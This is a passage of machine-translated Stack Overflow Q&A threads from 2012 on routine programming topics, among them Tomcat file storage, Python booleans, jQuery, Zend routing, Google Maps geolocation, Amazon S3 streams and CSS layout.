我的 webapp 将 PDF 文件写入下载文件夹，据我所知，该文件夹必须位于我的 Eclipse 项目的 WebContent 文件夹中。

问题是，当我安装一个新的 WAR 文件时，当 Tomcat 解压缩它时，它会清除下载文件夹的内容，因此用户之前的输出会丢失。

提前感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T06:09:36.933

我认为，将用户文件保存到 Web 应用程序的 WebContent 文件夹是不正确的（至少，不是很方便）。WebContent 文件夹用于存放在 Web 应用程序存档中分布的资源。

通常的做法是将磁盘上的某个特定位置用于**计划重复使用的用户文件**。

1) 要在配置文件中指定位置，请在应用程序 CLASSPATH 的根目录中创建文件 app.properties。在此文件中，您将拥有该属性

```
user.pdfs.location=/path/to/user/pdfs 
```

要读取该属性，请在您的 servlet 中使用以下代码：

```
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
InputStream propsStream = classLoader.getResourceAsStream("app.properties");

Properties properties = new Properties();
properties.load(propsStream);

String userPdfsPath = properties.getProperty("user.pdfs.location"); 
```

因此，您将始终能够在已创建的 WAR 中更改“/WEB-INF/classes/app.properties”文件中 PDF 的位置。

2）或者您可以将参数传递给Tomcat的JVM：

```
-Duser.pdfs.location="/path/to/user/pdfs" 
```

要读取参数的值，请使用以下代码：

```
String userPdfsPath = System.getProperty("user.pdfs.location"); 
```

**另一种流行（但并不总是正确）的方法**是将文件作为 BLOB 保存到数据库中。考虑到在这种情况下，您有时可能会遇到应用程序性能或备份问题。

**如果您想使用临时文件**（例如，您想创建 PDF 供用户下载），您应该使用 JVM 的临时目录。获取临时目录使用

```
String tempDirPath = System.getProperty("java.io.tmpdir"); 
```

或者简单地创建临时 PDF 文件

```
File tempPDF = File.createTempFile("temp-", ".pdf"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T16:25:28.583

每当您重新部署任何应用程序时，Tomcat 都会清除 war 文件和提取的文件夹。因此，很明显，如果您在提取的 war 路径中存储任何内容，它将在下次重新部署时被删除。此外，将任何用户数据存储在提取的 Web 应用程序中通常不是一个好习惯。如果您选择任何其他路径来创建用户文件，这对您来说也会更好、更方便。

# python - Python的布尔排序定义了吗？

> ID：13353744
> 
> 赞同：12
> 
> 时间：2012-11-13T00:12:20.323
> 
> 标签：python, sorting, undefined-behavior

是否在 Python 中明确定义了 True 和 False 的顺序，还是将其保留为实现细节？

在控制台中，我在 True 之前看到了 False 排序……但我不知道这是否是我应该依赖的行为。

（我确定有一些关于此的 Python 文档，但我找不到它......）

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-13T00:21:28.920

[http://docs.python.org/2/reference/datamodel.html#the-standard-type-hierarchy](http://docs.python.org/2/reference/datamodel.html#the-standard-type-hierarchy)

> **布尔**值：这些代表真值 False 和 True。表示值 False 和 True 的两个对象是唯一的布尔对象。Boolean 类型是纯整数的子类型，在几乎所有上下文中，Boolean 值的行为分别类似于值 0 和 1，例外是当转换为字符串时，返回字符串“False”或“True”，分别。

这告诉我，python 语言需要`False < True`, `False == 0`, `True == 1`, `True != 2`.

[Python 3](http://docs.python.org/3/reference/datamodel.html#the-standard-type-hierarchy)中也保留了相同的措辞。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-12-02T00:01:03.203

我们可以使用 Python REPL 显示 bool 是可排序的，并且`False`是较低的值：

```
>>> sorted([False, True, True, False, True])
[False, False, True, True, True] 
```

# android - 为平板电脑修改 Android 中的默认窗口标题？

> ID：13353753
> 
> 赞同：1
> 
> 时间：2012-11-13T00:13:11.010
> 
> 标签：android, window, contextmenu, title, custom-titlebar

我正在寻找一种方法来稍微修改手机和平板电脑的 Android 应用程序中的默认窗口标题。下面的示例是标准标题栏的平板电脑视图：

![android窗口标题栏](../Images/64090a1c2ecb0bde2e185ba4e698afea.png)

我已经尝试实现一个自定义标题栏，它可以工作，但上下文菜单（红色圆圈）消失了，这是我需要的。我想要做的就是改变底部边框的颜色或完全移除底部边框。

有没有办法在保留上下文菜单的同时进行更改？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:42:49.210

在应用程序标记中的清单中定义为：

```
android:theme="@style/mytheme" 
```

现在在 res/values 中，您可以定义一个名为 theme.xml 的文件，其内容为：

```
<resources> 
<style name="mytheme" parent="@android:style/Theme" > 
   <item name="android:_DEFAULT_BASE_COLOR_1">#XXXXXX</item>
   <item name="android:windowNoTitle">true</item>
    ... . 
</style>
</resources> 
```

这将改变您的应用程序的基本配色方案。以下是主要在 Android 上使用的颜色主题：http: [//developer.android.com/design/style/color.html](http://developer.android.com/design/style/color.html)

# c++ - 如果一个类继承 NSObject 会产生多少开销

> ID：13353754
> 
> 赞同：1
> 
> 时间：2012-11-13T00:13:19.013
> 
> 标签：c++, objective-c

我有一个轻量级的 c++ 类需要移植到 Objective-C 以利用 NSObject 提供的设施。将有数千个 C++ 类的实例，我不想通过将其包装在 NSObject 派生类中来增加太多开销。

NSObject 有多大？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:28:05.910

首先，你应该从`NSObject`. 不这样做没有明显的好处。`NSObject`在类的最低级别表示上没有添加任何存储，但添加了很多行为，这些行为将允许您的类在运行循环、普通集合（例如，`NSArray`或`NSDictionary`）以及几乎所有其他内容中正确运行。

具体回答你的问题：

```
#import <objc/runtime.h>

...

NSLog(@"obj size: %zd", class_getInstanceSize([NSObject class])); 
```

在 iOS 上输出“4”，在 64 位 OS X 上输出“8”。所以您要寻找的答案是“整数的自然大小”。`NSProxy`大小相同，`UIView`（在 iOS 上）为 84 字节。

文档在`class_getInstanceSize`这里[——](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html#//apple_ref/c/func/class_getInstanceSize)它显式地返回“[t]he size in bytes of the class cls”，顾名思义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T00:19:12.810

在苹果文档中它[在这里](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSObject_Class/Reference/Reference.html)说

> 所有 Objective-C 类的根类是 NSObject，它是 Foundation 框架的一部分。Cocoa 或 Cocoa Touch 应用程序中的所有对象最终都继承自 NSObject。此类是其他类与 Objective-C 运行时交互的主要访问点

所以我想说每个objective-c类最终都派生自NSObject，所以你别无选择。如果我错了，请纠正我。

**编辑：** 我现在学到的是 NSObject 是*一个根类*，它实现了每个objective-c类所期望的基本行为。所以基本上你可以编写一个实现NSObject协议的objective-c类（我认为这是objective-c代表接口）并实现像你自己这样的基本`alloc`东西`init`。请务必查看此线程：[如何在 Objective-C 中实例化一个不继承自 NSObject 的类](https://stackoverflow.com/questions/8954075/how-to-instantiate-a-class-in-objective-c-that-dont-inherit-from-nsobject)

**编辑：**对 Objective-c 中的根类 有更[深入的了解](http://cocoadev.com/wiki/RootClass)，非常有趣！

# javascript - Slideup and slidedown box

> ID：13353764
> 
> 赞同：0
> 
> 时间：2012-11-13T00:14:06.557
> 
> 标签：javascript, jquery

I have a big green box using `<div>`, and I have two more smaller divs called red and blue.

When someone clicks on green box, I want the red box to slide up at the same time blue box slides down.

And then when someone clicks on the green box, the red box should slide down and green box should slide up.

I have written this basic scripts, but when I click on the green box, both the red box and the green box will slide up at the same time.

How can make it so that one goes up and the other goes down at the same time?

CSS:

```
.block {
   position: absolute;
   left: 23px;
   top: 34px;
   width: 500px;
   height: 360px;
   z-index: 1;
   background-color: #0F0;
}
.top-box {
   background-color: #F00;
   height: 179px;   width: 499px;
   z-index: 50;
}

.top-down {
   background-color: #00F;
   height: 179px;
   width: 499px;
   z-index: 50;
}

.bottom-box {
   background-color: #06F;
   height: 179px;
   width: 499px;
}

#red {
   position: absolute;
   left: 266px;
   top: 399px;
   width: 494px;
   height: 138px;
   z-index: 2;
}

#blue {
   position: absolute;
   left: 26px;
   top: 35px;
   width: 494px;
   height: 138px;
   z-index: 2;
} 
```

JavaScript:

```
$(".block").click(
    function(){
       $(".top-box").slideUp('fast');
    },
    function(){
       $(".top-down").slideDown('slow');
    });
}); 
```

HTML:

```
<div class="block">    
   testing on green
   <div class="top-box" id="red">
      <div class="top-down" id="blue">
      </div>
   </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T03:13:00.413

您不能隐藏（通过向上滑动）父元素，然后期望子元素可见。既然`#blue`是这样的孩子`#red`是行不通的。此外，因为`#blue`已经可见，`slideDown()`所以无论如何都不会做任何事情。

另外，为什么要将两个函数传递给[.click()](http://api.jquery.com/click/)？`.click()`只需要一个处理函数。如果您传递两个参数，它会将第一个参数视为事件数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T03:15:29.837

正如我之前提到的，SlideUp 和 SlideDown 通过滑动隐藏匹配的元素。它不会“滑动”东西。

我修改了您的代码以使用`animate`函数创建效果。看看 jsfiddle，看看这是否是你所追求的？

[**http://jsfiddle.net/neo108/SRYXN/**](http://jsfiddle.net/neo108/SRYXN/)

# php - 如何在 Zend Framework 2 中使用路由传递参数？

> ID：13353770
> 
> 赞同：1
> 
> 时间：2012-11-13T00:14:49.707
> 
> 标签：php, zend-framework2, routes, params

我有一个路由器`test/view`，我想传递一些参数，例如`test/view/id/123`.

我不确定如何在 zf2 路由器中添加这些参数。

```
'router' => array(
        'routes' => array(
            'test' => array(
                'type'    => 'Literal',
                'options' => array(
                    'route'    => '/test',
                    'defaults' => array(
                        '__NAMESPACE__' => 'test\Controller',
                        'controller'    => 'Index',
                        'action'        => 'index',
                    ),
                ),
                'may_terminate' => true,
                'child_routes' => array(
                    'view' => array(
                        'type' => 'Literal',
                        'options' => array(
                            'route' => '/view',
                            'defaults' => array(
                                'controller' => 'Index',
                                'action'     => 'view',
                            ),
                        ),
                    ),
                ),
            ),
        ),
), 
```

我设置`view`为子路由，但不确定在哪里添加这些参数。

我试过`'route' => '/view/:id/:value'`了

```
'defaults' => array(
    'controller' => 'Index',
    'action'     => 'view',
    'id'         => 'value',
) 
```

但它们似乎不起作用

我试图了解这一切是如何运作的。

有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T00:25:23.557

```
'router' => array(
    'routes' => array(
        'test-view' => array(
            'type'    => 'segment',
            'options' => array(
                'route'    => '/test/view/:testId[/]',
                'constraints' => array(
                    'testId'     => '[0-9]+',
                ),
                'defaults' => array(
                    'controller' => 'Test\Controller\Index',
                    'action' => 'view'
                ),
            ),
        ), 
```

然后，在您的 ControllerAction 中，您可以使用以下方法获取参数“testId”：

```
$this->params('testId'); 
```

顺便说一句：上面的路线给你一个这样的网址：`/test/view/123`- 我想你可能会摆脱“id”参数。

如果您想创建指向其中一种页面的链接，您可以`$this->url('test-view', array('testId' => 123))`在其中一个视图中使用。

# javascript - jQuery "live" validation of form

> ID：13353771
> 
> 赞同：0
> 
> 时间：2012-11-13T00:15:01.790
> 
> 标签：javascript, jquery

I have recently completely recoded my site registration form, a lot of my users were complaining that upon registration, they would fill out the form only to be told that the username was already taken, or some other error that meant they would have to retype all of that information.

I set off today designing and coding the new registration page, and the resulting response from my users is that it looks more user friendly, and when the "live" validation is included, it will be just right.

Anyway, here is how my registration page looks, with the location of the divs that will contain errors;

![Image showing how the design of the form looks](../Images/b6fdf3f08412f5df87793e7b5f6bf26a.png)

For each area of the form, I have added the **same div class** next to it, which I hope I can then hide / unhide depending on what the user has typed in.

My issue is, surely if I use that same class for ALL of the fields, it will update ALL of the error fields when I use something like the innerHTML function?

jQuery is far from my strong point, and I would really appreciate any help. I will add more information if it is requested, thanks!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:21:56.730

基本上你验证像`keyUp`or之类的事件`blur`，当验证完成时，你通过从输入元素上升到包含输入和错误 div 的元素遍历正确的 div，然后按它的类搜索错误 div。这样你就可以确保只为正确的元素避免错误。

假设输入和错误 div 周围的元素（以及可能的标签等）具有类`element`并且错误 div 具有类`error`

```
$('input').blur(function() {

    // on error:
    $(this).parents('.element').find('.error').text('Some error occured').show();
}); 
```

如果您使用 ajax 进行验证，则错误内容需要在 ajax 回调 ofc 中...还需要相同的例程才能成功验证：删除文本并隐藏错误 div...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:18:36.520

为什么不给每个字段一个 id 并使用选择器`#whatever`而不是`.whatever`访问每个特定字段？

# javascript - Display custom media upon reaching a marker in google maps

> ID：13353772
> 
> 赞同：1
> 
> 时间：2012-11-13T00:15:04.507
> 
> 标签：javascript, html, google-maps

I'm building a mobile application using HTML and JavaScript, I'm looking to have either a video, photo, or audio be displayed upon the user reaching a custom marker I have set on the map. The code I have so far is below. My question is how do I go about recognizing that the user is around my marker and how do I display audio, video, photos, or text upon the user reaching that location? This media will most likely be stored on a SQL server I've set up. If anyone can point me in the right direction, or let me know how to do this it would be much appreciated.

Thanks!

My code so far:

```
 <!doctype  html>
    <html>
    <head>
        <title>Application Demo</title>
        <meta name="viewport" conmtent="width=device-width, initial-scale=1.0,     user-scalable=no">
        <meta charset="utf-8">
            <style>
                html, body, #mapcanvas {
                    margin: 0;
                    padding: 0;
                    height: 98%;
                    }
            </style>
            <script src="https://maps.googleapis.com/maps/api/js?    v=3.exp&sensor=false"></script>
             <script>
      var map;

      var coords = new google.maps.LatLng(36.995698, -86.762123);
      function initialize() {
        var mapOptions = {
          zoom: 18,
          center: coords,
          mapTypeId: google.maps.MapTypeId.HYBRID

            };
        map = new google.maps.Map(document.getElementById('mapcanvas'),
            mapOptions);
        var marker = new google.maps.Marker({
            position: coords,
            map: map,
            title: 'ITE',
            });
            }
    </script>
    </head>
    <body onload="initialize()">
        <div id="mapcanvas"></div>
        <div>
                <p>Maps provided by Google Maps</p>
        </div>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T04:17:58.497

我认为您可以根据自己的目的收藏此代码。

```
<!DOCTYPE html>
<html>
  <head>
    <title>Application Demo</title>
    <meta name="viewport" conmtent="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta charset="utf-8">
    <style>
      html, body, #mapcanvas {
        margin: 0;
        padding: 0;
        height: 98%;
      }
    </style>
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>
    <script>
      var map;
      var positions = [
        {lat : 36.995, lng : -86.764, "id" : "12345", pos : null, marker : null},
        {lat : 36.996, lng : -86.762, "id" : "67890", pos : null, marker : null}
      ];

      function initialize() {
        var coords = new google.maps.LatLng(36.995698, -86.762123);
        var mapOptions = {
          zoom : 18,
          center : coords,
          mapTypeId : google.maps.MapTypeId.HYBRID
        };
        map = new google.maps.Map(document.getElementById('mapcanvas'), mapOptions);
        google.maps.event.addListenerOnce(map, "bounds_changed", watchStart);

        var i;
        for (i = 0; i < positions.length; i++) {
          positions[i].pos = new google.maps.LatLng(positions[i].lat, positions[i].lng);
        }

      }

      //Check Geolocation API of HTML5
      function watchStart() {
        if (navigator.geolocation) {
          navigator.geolocation.watchPosition(showPosition);
        } else {
          alert("Geolocation is not supported by this browser.");
        }
      }

      function createMarker(options) {
        var marker = new google.maps.Marker(options);
        google.maps.event.addListener(marker, "click", onMarker_clicked);
        return marker;
      }

      function onMarker_clicked() {
        alert(this.get("id"));
      }

      function showPosition(position) {
        var nowPos = new google.maps.LatLng(position.coords.latitude, position.coords.longitude);
        map.panTo(nowPos);

        var distance, bounds = map.getBounds();
        for (var i = 0; i < positions.length; i++) {
          if (bounds.contains(positions[i].pos)) {
            if (!positions[i].marker) {
              //The markers which are inside of the map.
              positions[i].marker = createMarker({
                position : positions[i].pos,
                map : map,
                id : positions[i].id
              });
            }
          } else if (positions[i].marker){
            //The markers which are out side of the map.
            positions[i].marker.setMap(null);
            delete positions[i].marker;
          }
        }
      }
    </script>
  </head>
  <body onload="initialize()">
    <div id="mapcanvas"></div>
    <div>
      <p>
        Maps provided by Google Maps
      </p>
    </div>
  </body>
</html> 
```

# c# - Keypress Upper/Lowercase exceptions

> ID：13353775
> 
> 赞同：0
> 
> 时间：2012-11-13T00:15:21.153
> 
> 标签：c#, hex, keypress

i have a little tiny problem, what i am trying to do is limit my textBox to the following characters: [a=>f, x, A=>F, 0=>9], and what i need exactly is add an exception that will make any lower case input in the mentioned textBox become uppercase, except for "x", this is what i tried, but it limited all inputs from the textBox:

```
if (!Char.IsDigit(e.KeyChar) && !Char.IsControl(e.KeyChar) && (e.KeyChar < 'A' || e.KeyChar > 'F') && (e.KeyChar < 'a' || e.KeyChar > 'f') && (e.KeyChar != ' '))
        {
            e.Handled = true;
            textBox1.CharacterCasing = CharacterCasing.Upper;
        }
        else if ((e.KeyChar != 'x'))
        {
            e.Handled = true;
            textBox1.CharacterCasing = CharacterCasing.Lower;
        } 
```

Thank you.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:23:26.543

设法绕过它：

```
if (!Char.IsDigit(e.KeyChar) && !Char.IsControl(e.KeyChar) && (e.KeyChar < 'A' || e.KeyChar > 'F') && (e.KeyChar < 'a' || e.KeyChar > 'f') && (e.KeyChar != ' ') && (e.KeyChar != 'x'))
        {
            e.Handled = true;
        }
        //textBox1.CharacterCasing = CharacterCasing.Upper;
        if (e.KeyChar == 'x') e.KeyChar = Char.ToLower(e.KeyChar);
        else e.KeyChar = Char.ToUpper(e.KeyChar); 
```

谢谢你。

# c++ - 哪个编译器首先评估最左边的参数

> ID：13353783
> 
> 赞同：2
> 
> 时间：2012-11-13T00:16:19.287
> 
> 标签：c++, compiler-construction, operator-precedence

我知道函数参数的评估顺序在 C++ 中是**未指定**的，见下文，

// 简单明显的一个。

```
callFunc(getA(),getB()); 
```

可以**等价**于：

```
int a = getA();
int b = getB();
callFunc(a,b);
Or this:

int b = getB();
int a = getA();
callFunc(a,b); 
```

这很好，我想大多数人都知道这一点。

但是我已经尝试过 VC10、gcc 4.72 并且它们都首先评估 b（从右到左），这意味着 b 先被推入堆栈帧，然后是 a。

我只是想知道我应该尝试使用哪个 c++ 编译器来使上面的代码评估第一个？所以 a 在 b 之前被推入堆栈。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T00:26:37.187

参数评估顺序基本上取决于用于调用给定函数的调用约定 - 如果参数被推送到堆栈 RTL 上，通常首先详细说明最右边的参数更方便。

根据[此](http://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions)表，在 x86 上，IA32 上唯一可用的调用约定（在堆栈上具有 LTR 参数顺序）是`fastcall`在 Borland 上，但是它将前三个整数/指针参数传递到寄存器中。所以你应该写一个接受三个以上整数的函数，把它标记为`fastcall`并用Borland编译器编译它；在这种情况下，*可能*除了前三个参数之外的其他参数应该按 LTR 顺序进行评估。

在其他平台上，您可能会发现其他带有 LTR 参数传递的调用约定（可能还有 LTR 参数评估）。

请注意，参数传递顺序 <=> 参数评估顺序在逻辑上是绑定的，但如果由于某种原因编译器发现最好先评估某些参数，则标准中没有任何内容阻止它这样做。

# cakephp-2.2 - 在 CakePhp 2.2.3 中访问 userModel

> ID：13353786
> 
> 赞同：0
> 
> 时间：2012-11-13T00:16:34.140
> 
> 标签：cakephp-2.2

我正在从 Cake 1.3 升级到最新的 Cake 2。

我曾经从 App Component 访问用户模型：

```
$this->Auth->userModel-> 
```

然而，那个领域已经不存在了。

有替代方案吗？

我也试过

```
App::uses('User', 'Model');
$user = new User(); 
```

但我得到了错误

```
Class 'AppModel' not found 
```

访问用户模型的任何替代方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T10:06:56.353

通过访问用户（或任何）模型，您究竟想做什么？

如果在控制器中，您可以添加带有控制器`$uses`变量的模型：

```
public $uses = array('User'); 
```

您还可以通过“跳过模型关联”来访问任何模型。例如，如果您在控制器的属性中并且`UsersController`希望在控制器的属性中使用`Costume`模型，您可以执行以下操作：`User hasMany Costume``Costume``$uses`

```
$this->User->Costume->find(); 
```

模型协会的存在是强制性的，否则它将不起作用。这是可能的，因为 User 模型与它的任何关联模型都有内部关联。

由于组件包装了控制器，因此您也应该能够在此处执行此操作，或者应该从您可以调用的地方引用对控制器的引用：`User->Costume->find();`但是在这种情况下，`Component`您最好将数据传递给它而`Controller`不是尝试从中调用模型.

# java - 如何从不同于网络的本地文件中读取 InputStream 对象（通过 Amazon S3）？

> ID：13353789
> 
> 赞同：8
> 
> 时间：2012-11-13T00:16:48.180
> 
> 标签：java, file, amazon-s3, inputstream, local

我认为从本地文件读取的输入流对象与从网络源（在本例中为 Amazon S3）读取的输入流对象之间没有区别，因此希望有人能启发我。

这些程序在运行 Centos 6.3 的 VM 上运行。两种情况下的测试文件都是 10MB。

本地文件代码：

```
 InputStream is = new FileInputStream("/home/anyuser/test.jpg");

    int read = 0;
    int buf_size = 1024 * 1024 * 2;
    byte[] buf = new byte[buf_size];

    ByteArrayOutputStream baos = new ByteArrayOutputStream(buf_size);

    long t3 = System.currentTimeMillis();
    int i = 0;
    while ((read = is.read(buf)) != -1) {
        baos.write(buf,0,read);
        System.out.println("reading for the " + i + "th time");
        i++;
    }
    long t4 = System.currentTimeMillis();
    System.out.println("Time to read = " + (t4-t3) + "ms"); 
```

这段代码的输出是这样的：它读取了 5 次，这是有道理的，因为读入的缓冲区大小是 2MB，而文件是 10MB。

```
reading for the 0th time
reading for the 1th time
reading for the 2th time
reading for the 3th time
reading for the 4th time
Time to read = 103ms 
```

现在，我们使用相同的 10MB 测试文件运行相同的代码，除了这一次，源来自 Amazon S3。在我们完成从 S3 获取流之前，我们不会开始阅读。但是，这一次，读取循环运行了数千次，而它应该只读取 5 次。

```
 InputStream is;
    long t1 = System.currentTimeMillis();
    is = getS3().getFileFromBucket(S3Path,input);
    long t2 = System.currentTimeMillis();

    System.out.print("Time to get file " + input + " from S3: ");
    System.out.println((t2-t1) + "ms");

    int read = 0;
    int buf_size = 1024*1024*2;
    byte[] buf = new byte[buf_size];

    ByteArrayOutputStream baos = new ByteArrayOutputStream(buf_size);
    long t3 = System.currentTimeMillis();
    int i = 0;

    while ((read = is.read(buf)) != -1) {
        baos.write(buf,0,read);
        if ((i % 100) == 0)
        System.out.println("reading for the " + i + "th time");
        i++;
    }
    long t4 = System.currentTimeMillis();

    System.out.println("Time to read = " + (t4-t3) + "ms"); 
```

输出如下：

```
Time to get file test.jpg from S3: 2456ms
reading for the 0th time
reading for the 100th time
reading for the 200th time
reading for the 300th time
reading for the 400th time
reading for the 500th time
reading for the 600th time
reading for the 700th time
reading for the 800th time
reading for the 900th time
reading for the 1000th time
reading for the 1100th time
reading for the 1200th time
reading for the 1300th time
reading for the 1400th time
Time to read = 14471ms 
```

读取流所需的时间从运行到运行变化。有时需要 60 秒，有时需要 15 秒。它不会超过 15 秒。在程序的每次测试运行中，读取循环仍然循环 1400 多次，即使我认为它应该只有 5 次，就像本地文件示例一样。

即使我们已经从网络源获取文件，当源通过网络时输入流是这样工作的吗？在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T00:36:49.103

我不认为它特定于java。当您从网络读取时，对操作系统的实际读取调用将一次返回一个数据包，无论您分配的缓冲区有多大。如果您检查读取数据的大小（您的读取变量），它应该显示使用的网络数据包的大小。

这就是人们使用单独的线程从网络读取并通过使用异步 i/o 技术避免阻塞的原因之一。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T03:06:33.177

正如@imel96 指出的那样，文档中没有任何内容可以保证您所期望的行为。您永远不会一次从套接字读取 2MB，因为套接字接收缓冲区通常不是那么大，与带宽等其他因素完全不同。

# html - 将 2 个 div 并排放置，左侧填充空间

> ID：13353793
> 
> 赞同：0
> 
> 时间：2012-11-13T00:17:06.437
> 
> 标签：html, css, web, styles

如何将两个`div`s 并排放置（左右），以便左侧`div`自动调整大小，具体取决于右侧的宽度`div`。

例如，如果右边的容器很`100px`宽，而容器中的右边`div`很`10px`宽，那么左边`div`就是`90px`宽的。或者，如果右边`div`很`40px`宽，那么左边就很`60px`宽。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:31:59.967

这是我经常使用的技巧

```
<style>
    .sidebar {
        width: 600px;
        float: left;
        background: #00ff00;
    }

    .content {
        margin-left: 610px;
        background: #ff0000;
    }
</style>

<div class="sidebar">
    sidebar
</div>

<div class="content">
    content
</div> 
```

您设置一个元素的宽度并将其浮动，然后通过在其上放置与浮动元素相同宽度的边距来强制您想要坐在它旁边的元素进入间隙。

警告语：在本例中，侧边栏元素必须首先出现在您的源代码中。

您可以通过更改一个元素的宽度和另一个元素的边距来动态调整列的宽度。

将源代码保存到桌面上的 html 文件中，然后试一试以了解它是如何工作的。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-13T00:40:02.907

我同意上面的评论。只需确保`float: right;`您想要的 div 位于屏幕右侧。我会将此作为附加评论，但没有足够的代表这样做。

```
<style>
    .left {
        width: auto;
    }

    .right {
        width: 100px;
        float: right;
    }
</style> 
```

# javascript - 实现增加和减少页面字体大小的按钮的最佳方法是什么（使用 jQuery）？

> ID：13353797
> 
> 赞同：1
> 
> 时间：2012-11-13T00:18:06.153
> 
> 标签：javascript, jquery, html, css

我想要两个按钮，一个是减少按钮，另一个是增加按钮，分别减小和增加整个页面的字体大小。

假设一些`p`标签设置为 16px 字体，`h1`标签设置为 30px，标签设置`li`为 14px 等。

我如何使用 jQuery 对 click 函数进行编码以增加其字体大小。我也有兴趣让他们只能做到这一点，比如在任一方向上说 5 次，以避免荒谬的字体大小。

我有这样的东西：

```
 $('button.decrease').click(function() {
        var fontSize = $('p').css('font-size');

        if (fontSize == "14px") {
            $('p').css({
                'font-size': '12px'
            });
        }
        else if (fontSize == "16px") {
            $('p').css({
                'font-size': '14px'
            });
        }
        else if (fontSize == "18px") {
            $('p').css({
                'font-size': '16px'
            });
        }
        else if (fontSize == "20px") {
            $('p').css({
                'font-size': '18px'
            });
        }
        else if (fontSize == "22px") {
            $('p').css({
                'font-size': '20px'
            });
        } 
    });

    $('button.increase').click(function() {
        var fontSize = $('p').css('font-size');

        if (fontSize == "12px") {
            $('p').css({
                'font-size': '14px'
            });
        }
        else if (fontSize == "14px") {
            $('p').css({
                'font-size': '16px'
            });
        }
        else if (fontSize == "16px") {
            $('p').css({
                'font-size': '18px'
            });
        }
        else if (fontSize == "18px") {
            $('p').css({
                'font-size': '20px'
            });
        }
        else if (fontSize == "20px") {
            $('p').css({
                'font-size': '22px'
            });
        }
    }); 
```

但它只适用于增加`p`标签的大小，我希望它在整个页面上都是全局的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:28:37.243

您可以将函数传递给该`css`方法。

```
$('#decrease').click(function() {
    $('p, h1, li').css('font-size', function(i, v) {
        return  +v.match(/\d+/).join() - 2
    })
})

$('#increase').click(function() {
    $('p, h1, li').css('font-size', function(i, v) {
        return  +v.match(/\d+/).join() + 2 
    })
}) 
```

[http://jsfiddle.net/s3TJr/](http://jsfiddle.net/s3TJr/)

您可以使用通用选择器`*`来选择所有元素，但这太*过分*了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:36:34.783

这是一个简单的例子：

```
$(document).ready(function() {

    $('#inc').click(function() {

        $('*').each(function() {
            $(this).css('font-size', parseInt($(this).css('font-size').replace(/px$/,'')) + 2 + "px");
        });
    }) ;

    $('#dec').click(function() {

        $('*').each(function() {
            $(this).css('font-size', parseInt($(this).css('font-size').replace(/px$/,'')) - 2 + "px");
        });
    }) ;
}); 
```

这里的工作示例：http: [//jsfiddle.net/YT8K4/1/](http://jsfiddle.net/YT8K4/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:57:09.833

您可以在 em 中设置字体大小，而不仅仅是更改父元素的字体大小，例如正文，例如

```
<div class="small">
<div style="font-size: 1em;">
    Text 1
</div>

<div style="font-size: 1.5em;">
    Text 1.5
</div>

<div style="font-size: 0.5em;">
    Text 0.5
</div>
</div> 
```

和你的CSS：

```
.small {font-size: 0.85em;}
.big {font-size: 1.25em;} 
```

一旦您更改父元素的 css 类，这将更改子元素的文本大小，如下所示：[jsFiddle](http://jsfiddle.net/EsFWn/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T01:29:30.803

CSS和JS的结合怎么样？默认情况下，在标签上加载类别为“100”的页面。那么 JS 可以是：

```
<html data-zoom=100>

----

[data-zoom="80"] h1,
[data-zoom="80"] p {
    font-size: 80%;
}

[data-zoom="120"] h1,
[data-zoom="120"] p {
    font-size: 120%;
}

----

<a href="#" class="-">-</a>
<a href="#" class="+">+</a>

----

var upDown = function () {
    var zoom = 100, zoomBy = 20;
    return function (e) {
        zoom = e.currentTarget.className === '-'? zoom - zoomBy : zoom + zoomBy;
        document.documentElement.dataset.zoom =  zoom;
    }
}();

$('.-, .\\+').on('click', upDown); 
```

查看[http://jsbin.com/ehoyep/2/](http://jsbin.com/ehoyep/2/)以获取示例。

# c# - 获取除根元素之外的整个 XML

> ID：13353799
> 
> 赞同：2
> 
> 时间：2012-11-13T00:18:09.790
> 
> 标签：c#, xml, linq

```
<Employees>
  <Product_Name>
    <hello1>product1</hello1>
    <hello2>product2</hello2>
    <hello3>product3</hello3>
    <hello4>product4</hello4>
  </Product_Name>
  <product_Price>
    <hello1>111</hello1>
    <hello2>222</hello2>
    <hello3>333</hello3>
    <hello4>444</hello4>
  </product_Price>
</Employees> 
```

是否可以使用 C# 将以下 XML 转换为如下所示的 XML。我尝试使用删除功能，但没有奏效。我也尝试获取根节点的值。没用

```
 <Product_Name>
    <hello1>product1</hello1>
    <hello2>product2</hello2>
    <hello3>product3</hello3>
    <hello4>product4</hello4>
  </Product_Name>
  <product_Price>
    <hello1>111</hello1>
    <hello2>222</hello2>
    <hello3>333</hello3>
